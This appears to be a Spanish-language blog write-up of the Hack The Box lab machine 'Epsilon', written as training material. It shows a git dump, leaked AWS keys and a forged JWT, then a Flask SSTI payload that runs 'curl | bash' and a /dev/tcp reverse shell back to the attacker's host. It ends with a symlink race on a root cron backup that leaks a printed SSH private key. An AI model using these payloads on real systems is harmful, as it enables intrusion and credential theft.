---
layout: post
title: Epsilon
date: 2023-06-15
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSCP, OSWE]
---
___

<center><img src="/writeups/assets/img/Epsilon-htb/Epsilon.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Abuso de Git expuesto

* Enumeración AWS

* Enumeración función Lambda

* Creación de JWT

* Bypass Login

* SSTI - RCE

* Abuso de tarea CRON (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.134 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-15 15:10 GMT
Nmap scan report for 10.10.11.134
Host is up (0.079s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,5000 10.10.11.134 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-15 15:11 GMT
Nmap scan report for 10.10.11.134
Host is up (0.062s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: 403 Forbidden
| http-git: 
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
|_http-server-header: Apache/2.4.41 (Ubuntu)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
|_http-title: Costume Shop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.56 seconds
```

## Puerto 80,5000 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.134
http://10.10.11.134 [403 Forbidden] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.134], Title[403 Forbidden]
```

La página principal me devuelve un ```403```, pero puedo descargar el ```GIT```

```null
git-dumper http://10.10.11.134/.git/ git-proyect
```

Tiene varios commits

```null
 git log
commit c622771686bd74c16ece91193d29f85b5f9ffa91 (HEAD -> master)
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 17:41:07 2021 +0000

    Fixed Typo

commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:02:59 2021 +0000

    Adding Costume Site

commit c51441640fd25e9fba42725147595b5918eba0f1
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:58 2021 +0000

    Updatig Tracking API

commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:28 2021 +0000

    Adding Tracking API Module
```

Obtengo los cambios entre todos los commits

```null
git diff 7cf92a7a09e523c1c667d13847c9ba22464412f3
diff --git a/server.py b/server.py
new file mode 100644
index 0000000..dfdfa17
--- /dev/null
+++ b/server.py
@@ -0,0 +1,65 @@
+#!/usr/bin/python3
+
+import jwt
+from flask import *
+
+app = Flask(__name__)
+secret = '<secret_key>'
+
+def verify_jwt(token,key):
+       try:
+               username=jwt.decode(token,key,algorithms=['HS256',])['username']
+               if username:
+                       return True
+               else:
+                       return False
+       except:
+               return False
+
+@app.route("/", methods=["GET","POST"])
+def index():
+       if request.method=="POST":
+               if request.form['username']=="admin" and request.form['password']=="admin":
+                       res = make_response()
+                       username=request.form['username']
+                       token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
+                       res.set_cookie("auth",token)
+                       res.headers['location']='/home'
+                       return res,302
+               else:
+                       return render_template('index.html')
+       else:
+       else:
+               return render_template('index.html')
+
+@app.route("/home")
+def home():
+       if verify_jwt(request.cookies.get('auth'),secret):
+               return render_template('home.html')
+       else:
+               return redirect('/',code=302)
+
+@app.route("/track",methods=["GET","POST"])
+def track():
+       if request.method=="POST":
+               if verify_jwt(request.cookies.get('auth'),secret):
+                       return render_template('track.html',message=True)
+               else:
+                       return redirect('/',code=302)
+       else:
+               return render_template('track.html')
+
+@app.route('/order',methods=["GET","POST"])
+def order():
+       if verify_jwt(request.cookies.get('auth'),secret):
+               if request.method=="POST":
+                       costume=request.form["costume"]
+                       message = '''
+                       Your order of "{}" has been placed successfully.
+                       '''.format(costume)
+                       tmpl=render_template_string(message,costume=costume)
+                       return render_template('order.html',message=tmpl)
+               else:
+                       return render_template('order.html')
+       else:
+               return redirect('/',code=302)
+app.run(debug='true')
diff --git a/track_api_CR_148.py b/track_api_CR_148.py
index fed7ab9..8d3b52e 100644
--- a/track_api_CR_148.py
+++ b/track_api_CR_148.py
@@ -5,11 +5,11 @@ from boto3.session import Session
 
 
 session = Session(
-    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
-    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
+    aws_access_key_id='<aws_access_key_id>',
+    aws_secret_access_key='<aws_secret_access_key>',
     region_name='us-east-1',
-    endpoint_url='http://cloud.epsilong.htb')
-aws_lambda = session.client('lambda')    
+    endpoint_url='http://cloud.epsilon.htb')
+aws_lambda = session.client('lambda')
```

Se expone la clave e identificador de ```aws```. En el puerto 5000 tengo un panel de inicio de sesión

<img src="/writeups/assets/img/Epsilon-htb/1.png" alt="">

Pero como no tengo credenciales de momento lo voy a omitir. Agrego el subdominio ```cloud.epsilon.htb``` y el dominio ```epsilon.htb``` al ```/etc/hosts```

Agrego la configuración de ```aws``` a mi equipo

```null
aws configure
AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC
AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
Default region name [None]: us-east-1
Default output format [None]: json
```

Listo las funciones

```null
aws --endpoint-url=http://cloud.epsilon.htb lambda list-functions
{
    "Functions": [
        {
            "FunctionName": "costume_shop_v1",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
            "Runtime": "python3.7",
            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
            "Handler": "my-function.handler",
            "CodeSize": 478,
            "Description": "",
            "Timeout": 3,
            "LastModified": "2023-06-15T14:51:11.800+0000",
            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "fdc95c0a-6527-469d-bfeb-8cf55c48fa16",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip"
        }
    ]
}
```

Para la única existente traigo su contenido

```null
aws --endpoint-url=http://cloud.epsilon.htb lambda get-function --function-name=costume_shop_v1
{
    "Configuration": {
        "FunctionName": "costume_shop_v1",
        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
        "Runtime": "python3.7",
        "Role": "arn:aws:iam::123456789012:role/service-role/dev",
        "Handler": "my-function.handler",
        "CodeSize": 478,
        "Description": "",
        "Timeout": 3,
        "LastModified": "2023-06-15T14:51:11.800+0000",
        "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
        "Version": "$LATEST",
        "VpcConfig": {},
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "fdc95c0a-6527-469d-bfeb-8cf55c48fa16",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip"
    },
    "Code": {
        "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
    },
    "Tags": {}
}
```

Me puedo descargar el ```ZIP```

```null
wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
```

Contiene un script de ```python```

```null
cat lambda_function.py
import json

secret='RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124

'''Beta release for tracking'''
def lambda_handler(event, context):
    try:
        id=event['queryStringParameters']['order_id']
        if id:
            return {
               'statusCode': 200,
               'body': json.dumps(str(resp)) #dynamodb tracking for CR-342
            }
        else:
            return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
    except:
        return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }

```

Suponiendo que el secreto se reutiliza para el JWT, genero una cookie con ese valor

```null
python3
Python 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>> jwt.encode({'username': 'admin'}, "RrXCv`mrNe!K!4+5`wYq", algorithm="HS256")
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4'
```

Agrego la cookie en el navegador con nombre ```auth```, tal y como ponía en el código fuente

<img src="/writeups/assets/img/Epsilon-htb/2.png" alt="">

Al recargar, ya puedo dirigirme al directorio ```/home``` sin problema. Tengo las siguientes rutas para moverme

```null
cat server.py | grep app.rout
@app.route("/", methods=["GET","POST"])
@app.route("/home")
@app.route("/track",methods=["GET","POST"])
@app.route('/order',methods=["GET","POST"])
```

Genero un ```order``` de prueba

<img src="/writeups/assets/img/Epsilon-htb/3.png" alt="">

Aparece un campo que puedo controlar como input desde ```BurpSuite```

<img src="/writeups/assets/img/Epsilon-htb/4.png" alt="">

Como se está empleando ```Flask``` por detrás, pruebo un SSTI. Capturo la petición desde ```BurpSuite``` e introduzco lo siguiente:

{%raw%}
```null
costume={{3*3}}&q=&addr=test
```
{%endraw%}

En la respuesta aparece el cómputo

```null
<p style="font-family: 'Indie Flower', cursive;">Your order of "9" has been placed successfully.</p>
```

Valido si es vulnerable a RCE

{%raw%}
```null
costume={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}&q=&addr=test
```
{%endraw%}

Se ejecuta sin problema

```null
<p style="font-family: 'Indie Flower', cursive;">Your order of "uid=1000(tom) gid=1000(tom) groups=1000(tom)" has been placed successfully.</p>
```

Me envío una reverse shell. Para ello, creo un archivo ```index.html``` que comparto con ```python``` y lo interpreto con ```bash```

```null
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0<&1'
```

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.134 - - [15/Jun/2023 16:01:28] "GET / HTTP/1.1" 200 -
```


{%raw%}
```null
costume={{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl 10.10.16.6 | bash').read() }}&q=&addr=test
```
{%endraw%}

Recibo la conexión en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.134] 46098
bash: cannot set terminal process group (1035): Inappropriate ioctl for device
bash: no job control in this shell
tom@epsilon:/var/www/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
tom@epsilon:/var/www/app$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
tom@epsilon:/var/www/app$ export TERM=xterm
tom@epsilon:/var/www/app$ export SHELL=bash
tom@epsilon:/var/www/app$ stty rows 55 columns 209
```

Puedo ver la primera flag

```null
tom@epsilon:~$ cat user.txt 
2ba869dc0e6e636c3f92c320aedfc4de
```

# Escalada

Subo el ```pspy``` para detectar tareas que se ejecutan a intervalos regulares de tiempo

```null
2023/06/15 16:12:01 CMD: UID=0    PID=3228   | /bin/sh -c /usr/bin/backup.sh 
2023/06/15 16:12:01 CMD: UID=0    PID=3229   | date +%N 
2023/06/15 16:12:01 CMD: UID=0    PID=3231   | /usr/bin/tar -cvf /opt/backups/344478446.tar /var/www/app/ 
2023/06/15 16:12:01 CMD: UID=0    PID=3233   | /bin/bash /usr/bin/backup.sh 
2023/06/15 16:12:01 CMD: UID=0    PID=3232   | sha1sum /opt/backups/344478446.tar 
```

Se está ejecutando ```/usr/bin/backup.sh```. No tengo capacidad de escritura

```null
tom@epsilon:/tmp$ ls -l /usr/bin/backup.sh 
-rwxr-xr-x 1 root root 362 Dec  1  2021 /usr/bin/backup.sh
```

Pero sí leerlo

```null
tom@epsilon:/tmp$ cat !$
cat /usr/bin/backup.sh
#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*
```

En un punto, al comando ```tar``` se le pasa el parámetro ```-h```. En el manual se puede ver en qué consiste. Muestra el contenido por pantalla de un enlace simbólico

```null
-h, --dereference
       Follow symlinks; archive and dump the files they point to.

```

Creo un script en ```bash``` que se encargue de secuestrar el archivo

```null
tom@epsilon:/tmp$ cat toroot.sh 
#!/bin/bash

while true; do
	if [ -e /opt/backups/checksum ]; then
		rm -f /opt/backups/checksum
		ln -s -f /root/.ssh/id_rsa /opt/backups/checksum
		echo "[+] Pwned!!!"
		break
	fi
done
```

```null
tom@epsilon:/tmp$ ./toroot.sh 
[+] Pwned!!!
```

Copio el comprimido a ```/tmp```

```null
tom@epsilon:/tmp$ cp /var/backups/web_backups/814017470.tar .
```

Lo descomprimo

```null
tom@epsilon:/tmp$ tar -xf 814017470.tar 
```

Puedo ver la ```id_rsa```

```null
tom@epsilon:/tmp/opt/backups$ cat checksum 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Me conecto y puedo ver la segunda flag

```null
ssh -i id_rsa root@10.10.11.134
The authenticity of host '10.10.11.134 (10.10.11.134)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:18: [hashed name]
    ~/.ssh/known_hosts:24: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.134' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 15 Jun 2023 04:31:05 PM UTC

  System load:                      0.0
  Usage of /:                       67.2% of 5.78GB
  Memory usage:                     17%
  Swap usage:                       0%
  Processes:                        245
  Users logged in:                  0
  IPv4 address for br-a2acb156d694: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.134
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:6f56

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb  7 01:51:07 2022
root@epsilon:~# cat /root/root.txt 
6b3188c957cafd4d2268c43a6969e262
```